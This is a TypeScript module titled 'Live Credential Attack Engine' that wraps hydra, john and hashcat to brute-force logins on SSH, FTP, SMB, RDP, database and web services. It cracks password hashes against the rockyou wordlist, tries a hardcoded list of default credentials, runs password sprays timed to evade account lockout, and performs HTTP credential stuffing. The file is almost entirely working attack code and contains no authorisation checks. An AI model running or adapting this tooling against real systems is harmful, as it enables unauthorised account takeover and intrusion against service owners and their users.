/**
 * Live Credential Attack Engine
 * Real brute-force, hash cracking, credential stuffing.
 * Uses: hydra, john, hashcat (via execFile)
 */

import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import * as fs from 'node:fs'
import * as http from 'node:http'
import * as https from 'node:https'
import * as crypto from 'node:crypto'

const execFileP = promisify(execFile)

function rand() { return crypto.randomBytes(6).toString('hex') }

const DEFAULT_CREDS = [
  { u: 'admin', p: 'admin' }, { u: 'admin', p: 'password' }, { u: 'admin', p: '1234' },
  { u: 'root', p: 'root' }, { u: 'admin', p: '' }, { u: 'user', p: 'user' },
  { u: 'admin', p: 'admin123' }, { u: 'test', p: 'test' }, { u: 'guest', p: 'guest' },
  { u: 'pi', p: 'raspberry' }, { u: 'admin', p: '12345' }, { u: 'admin', p: 'pass' },
  { u: 'root', p: 'toor' }, { u: 'root', p: '' }, { u: 'sa', p: '' },
  { u: 'admin', p: 'changeme' }, { u: 'support', p: 'support' }, { u: 'admin', p: 'letmein' },
  { u: 'cisco', p: 'cisco' }, { u: 'tomcat', p: 's3cret' }, { u: 'admin', p: 'secret' },
  { u: 'operator', p: 'operator' }, { u: 'administrator', p: 'administrator' },
  { u: 'ftp', p: 'ftp' }, { u: 'anonymous', p: '' }, { u: 'postgres', p: 'postgres' },
  { u: 'mysql', p: 'mysql' }, { u: 'oracle', p: 'oracle' }, { u: 'vagrant', p: 'vagrant' },
  { u: 'ubuntu', p: 'ubuntu' },
]

export interface CredentialTarget {
  host: string
  port: number
  service: 'ssh' | 'ftp' | 'http-post-form' | 'smb' | 'rdp' | 'telnet' | 'mysql' | 'mssql' | 'smtp'
  httpPath?: string
  ssl?: boolean
}

export interface CrackResult {
  success: boolean
  username?: string
  password?: string
  hash?: string
  cracked?: string
  tool: string
  output: string
}

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)) }

export class LiveCredAttacks {
  async bruteForceHydra(
    target: CredentialTarget,
    users: string[],
    passwords: string[],
    opts: { tasks?: number; timeout?: number } = {}
  ): Promise<CrackResult> {
    const id = rand()
    const userFile = `/tmp/hydra_users_${id}.txt`
    const passFile = `/tmp/hydra_pass_${id}.txt`
    const outFile = `/tmp/hydra_out_${id}.txt`
    fs.writeFileSync(userFile, users.join('\n'))
    fs.writeFileSync(passFile, passwords.join('\n'))
    try {
      const args: string[] = [
        '-L', userFile,
        '-P', passFile,
        '-t', String(opts.tasks || 4),
        '-f',
        '-o', outFile,
        '-s', String(target.port),
        target.host,
      ]
      if (target.service === 'http-post-form' && target.httpPath) {
        args.push('http-post-form', target.httpPath)
      } else {
        args.push(target.service)
      }
      await execFileP('hydra', args, { timeout: opts.timeout || 120000 }).catch(() => {})
      let output = ''
      try { output = fs.readFileSync(outFile, 'utf-8') } catch { /* no output file = no find */ }
      const combined = output
      const match = combined.match(/login:\s*(\S+)\s+password:\s*([^\n]*)/)
      if (match && match[1]) {
        return { success: true, username: match[1].trim(), password: (match[2] || '').trim(), tool: 'hydra', output: combined.slice(0, 500) }
      }
      return { success: false, tool: 'hydra', output: combined.slice(0, 200) }
    } finally {
      for (const f of [userFile, passFile, outFile]) try { fs.unlinkSync(f) } catch { /* ignore */ }
    }
  }

  async crackHashJohn(hashFile: string, wordlist?: string): Promise<CrackResult[]> {
    const wl = wordlist || '/usr/share/wordlists/rockyou.txt'
    const results: CrackResult[] = []
    try {
      await execFileP('john', [hashFile, `--wordlist=${wl}`, '--format=auto'], { timeout: 60000 }).catch(() => {})
      const show = await execFileP('john', ['--show', hashFile], { timeout: 10000 }).catch(() => ({ stdout: '', stderr: '' }))
      const out = show.stdout
      const lines = out.split('\n')
      for (const line of lines) {
        const parts = line.split(':')
        if (parts.length >= 2 && !line.startsWith('0 ')) {
          results.push({ success: true, hash: parts[0], cracked: parts[1], tool: 'john', output: line })
        }
      }
    } catch (e) {
      results.push({ success: false, tool: 'john', output: String((e as Error).message || e).slice(0, 200) })
    }
    return results
  }

  async crackHashHashcat(hash: string, hashType: number, wordlist?: string): Promise<CrackResult> {
    const id = rand()
    const hashFile = `/tmp/hc_hash_${id}.txt`
    const outFile = `/tmp/hc_out_${id}.txt`
    const wl = wordlist || '/usr/share/wordlists/rockyou.txt'
    fs.writeFileSync(hashFile, hash + '\n')
    try {
      await execFileP('hashcat', ['-m', String(hashType), '-a', '0', hashFile, wl, '--force', '-o', outFile, '--quiet'], { timeout: 120000 }).catch(() => {})
      let cracked = ''
      try { cracked = fs.readFileSync(outFile, 'utf-8').trim() } catch { /* no output */ }
      if (cracked) {
        const parts = cracked.split(':')
        const plain = parts[parts.length - 1]
        return { success: true, hash, cracked: plain, tool: 'hashcat', output: cracked }
      }
      return { success: false, hash, tool: 'hashcat', output: 'not cracked' }
    } finally {
      for (const f of [hashFile, outFile]) try { fs.unlinkSync(f) } catch { /* ignore */ }
    }
  }

  async testDefaultCredentials(target: CredentialTarget): Promise<CrackResult> {
    const users = DEFAULT_CREDS.map(c => c.u)
    const passes = DEFAULT_CREDS.map(c => c.p)
    return this.bruteForceHydra(target, [...new Set(users)], [...new Set(passes)], { tasks: 4, timeout: 60000 })
  }

  async passwordSpray(target: CredentialTarget, users: string[], password: string): Promise<CrackResult[]> {
    const results: CrackResult[] = []
    for (const user of users) {
      await sleep(2000) // avoid lockout
      const r = await this.bruteForceHydra(target, [user], [password], { tasks: 1, timeout: 15000 })
      if (r.success) results.push(r)
    }
    return results
  }

  async credentialStuffHttp(
    url: string,
    pairs: Array<{ user: string; pass: string }>,
    opts: { userField: string; passField: string; failureIndicator: string }
  ): Promise<CrackResult[]> {
    const results: CrackResult[] = []
    const u = new URL(url)
    const lib = u.protocol === 'https:' ? https : http
    for (const pair of pairs) {
      await sleep(500)
      try {
        const body = `${encodeURIComponent(opts.userField)}=${encodeURIComponent(pair.user)}&${encodeURIComponent(opts.passField)}=${encodeURIComponent(pair.pass)}`
        const buf = Buffer.from(body)
        const resp = await new Promise<string>((resolve, reject) => {
          const req = lib.request({ method: 'POST', hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname, headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': buf.length } }, (res) => {
            let d = ''
            res.on('data', (c) => { d += c })
            res.on('end', () => resolve(d))
          })
          req.on('error', reject)
          req.write(buf)
          req.end()
        })
        if (!resp.includes(opts.failureIndicator)) {
          results.push({ success: true, username: pair.user, password: pair.pass, tool: 'http-stuff', output: resp.slice(0, 200) })
        }
      } catch { /* ignore */ }
    }
    return results
  }
}
